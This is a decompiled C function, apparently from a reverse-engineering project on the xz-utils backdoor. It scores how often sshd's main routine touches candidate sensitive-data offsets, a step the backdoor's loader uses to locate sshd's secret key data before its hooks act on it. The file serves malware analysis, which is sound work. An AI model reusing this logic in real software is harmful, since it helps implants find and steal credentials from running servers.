// /home/kali/xzre-ghidra/xzregh/103910_sshd_get_sensitive_data_score_in_main.c
// Function: sshd_get_sensitive_data_score_in_main @ 0x103910
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score_in_main(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Checks sshd's main routine for loads and stores against the candidate sensitive-data slots and weights them into a score. The loader folds this signal into the overall confidence metric before exposing the pointer to other hooks.
 */
#include "xzre_types.h"


int sshd_get_sensitive_data_score_in_main
              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  u8 *code_end;
  BOOL BVar1;
  BOOL BVar2;
  BOOL BVar3;
  int iVar4;
  
  iVar4 = 0;
  code_start = (u8 *)refs->entries[2].func_start;
  if (code_start != (u8 *)0x0) {
    code_end = (u8 *)refs->entries[2].func_end;
    BVar1 = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
    BVar2 = find_instruction_with_mem_operand
                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 0x10));
    BVar3 = find_instruction_with_mem_operand
                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 8));
    iVar4 = (((uint)(BVar1 != 0) - (uint)(BVar2 == 0)) + 2) - (uint)(BVar3 == 0);
  }
  return iVar4;
}

